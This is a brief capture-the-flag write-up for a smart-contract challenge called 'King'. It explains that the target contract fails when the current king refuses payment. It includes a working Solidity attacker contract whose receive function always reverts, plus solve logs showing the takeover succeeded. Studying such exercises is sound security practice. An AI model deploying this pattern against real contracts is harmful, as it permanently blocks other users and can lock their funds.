
### Challenge 09 King
- [Challenge Contract](src/09_King.sol)
- [Solve Script](script/09_KingSolve.s.sol)
- Vulnerability: the contract assumes 'king' address is payable, but the 'king' can just refuse any tx funds sent to him by simply reverting.
- patch: Check condition.

* Attacker contract:
```solidity
contract UnmovableKing {
	address target;
	constructor (address king) payable {
		target = king;
	}

	function attack() public {
		(bool success, ) = target.call{value: address(this).balance}("");
		require(success);
	}

	receive() external payable {
		// we revert on all incoming tx
		revert("Dont want any");
	}
}
```

```
== Logs ==
  Price to beat:  1000000000000000
  Starting Balance:  1000000000000000
  sending funds...
  We replaced the king. The throne is us for eternity
```

